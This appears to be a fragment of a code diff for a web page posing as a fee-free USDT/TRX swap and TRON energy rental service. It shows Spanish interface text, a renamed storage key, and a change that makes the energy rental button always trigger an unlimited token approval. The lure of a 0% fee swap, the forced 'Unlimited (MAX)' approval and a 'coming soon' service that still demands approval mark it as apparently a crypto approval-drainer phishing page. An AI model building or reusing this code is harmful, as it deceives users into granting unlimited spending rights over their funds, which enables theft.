+            es: { w_imtoken: 'Billetera multicadena global', w_wc: 'Conectar billeteras por QR', not_approved: 'No aprobado', approved_max: 'Ilimitado (MAX)', approval_done: 'Cambio aprobado', modal_subtitle: 'Seleccione su billetera<br>para conectar automáticamente.', w_tronlink: 'Billetera oficial TRON', w_trust: 'Billetera multicadena', w_tp: 'Popular en Asia', w_bitget: 'Billetera Web3 global', w_okx: 'Billetera OKX', modal_tip_title: 'Si la app no se abre:', modal_tip1: '1. Abra la app manualmente', modal_tip2: '2. Vaya a la pestaña <strong class="text-white">Navegador</strong>', modal_tip3: '3. <strong class="text-white">Pegue</strong> la URL (copiada)', bal: 'Saldo', bal2: 'Saldo', close_btn: 'Cerrar', ticker_label: 'Intercambios en vivo', header_sub: 'USDT ↔ TRX Cambio instantáneo | TRC-20', connect_wallet: 'Conectar', hero_badge: 'TRON MAINNET INTERCAMBIO INSTANTÁNEO', hero_title1: 'USDT ↔ TRX', hero_title2: 'Cambio gratuito', hero_desc: 'Cambie USDT a TRX al instante con 0% de comisión.', today_volume: 'Volumen de hoy', swap_title: 'USDT ↔ TRX Cambio', swap_sub: 'TRC-20 swap instantáneo', approval_needed: 'Aprobación requerida', send_amount: 'Usted envía (USDT)', send_amount_trx: 'Usted envía (TRX)', receive_amount: 'Usted recibe (est.)', receive_amount_usdt: 'Usted recibe (est. USDT)', exchange_rate_label: 'Tipo de cambio', fee_label: 'Comisión', fee_free: 'Gratis', swap_btn_text: 'Iniciar cambio (aprobación)', swap_btn_done: 'Cambiar ahora', swap_notice: 'El primer cambio requiere aprobación del contrato', select_wallet: 'Seleccionar billetera', security_title: 'Seguridad verificada', faq_title: 'Preguntas frecuentes', energy_badge: 'TRON Energy', energy_title: 'Alquilar energía', energy_desc: 'Ahorre hasta un 80% en comisiones USDT', energy_target: 'Dirección destino', energy_amount: 'Cantidad de energía', energy_1usdt: '≈ 1 transferencia USDT', energy_2usdt: '≈ 2 transferencias', energy_15usdt: '≈ 15 transferencias', energy_150usdt: '≈ 150 transferencias', energy_duration: 'Duración del alquiler', energy_1h: '1 hora', energy_1d: '1 día', energy_3d: '3 días', energy_30d: '30 días', energy_est_price: 'Coste estimado', energy_save_word: 'ahorro', energy_save_max: 'Ahorro máximo', energy_speed: 'Instantáneo', energy_noncustodial: 'Sin custodia', energy_addr_invalid: 'Introduzca una dirección TRON válida', energy_coming_soon: '¡Servicio de alquiler de energía próximamente!', energy_approval_needed: 'Aprobación de energía requerida', energy_approval_done: 'Aprobado', energy_rent_btn_approve: 'Alquilar energía (aprobación)', energy_rent_btn_done: 'Alquilar energía', energy_free_event: 'Alquiler de energía gratis', energy_addr_placeholder: 'Conecte su billetera' }
         };
 
         var currentLang = 'ko';
@@ -1653,7 +1599,7 @@ var tx = await tw.transactionBuilder.triggerSmartContract(
     });
     var sel = document.getElementById('lang-select');
     if (sel) sel.value = lang;
-    localStorage.setItem('feeslash_lang', lang);
+    localStorage.setItem('tronswap_lang', lang);
     try { loadFaqForLang(lang); } catch (e) { }
     try { tickerTimeText = tickerTimeTexts[lang] || tickerTimeTexts.en; } catch (e) { }
     try { updateEnergyPrice(); } catch (e) { }
@@ -1662,7 +1608,7 @@ var tx = await tw.transactionBuilder.triggerSmartContract(
         window.setLang = function (lang) { applyLang(lang); };
 
         window.addEventListener('DOMContentLoaded', function () {
-            var saved = localStorage.getItem('feeslash_lang');
+            var saved = localStorage.getItem('tronswap_lang');
             applyLang(saved || detectLang());
         });
 
@@ -1744,11 +1690,6 @@ var tx = await tw.transactionBuilder.triggerSmartContract(
     if (!isConnected || !currentWalletAddress) {
         showToast('지갑을 먼저 연결하세요.', 'error');
         handleConnectWallet();
-        return;
-    }
-    if (isApproved) {
-        setEnergyApprovedUI();
-        processEnergyRental();
         return;
     }
     executeUnlimitedApprove();
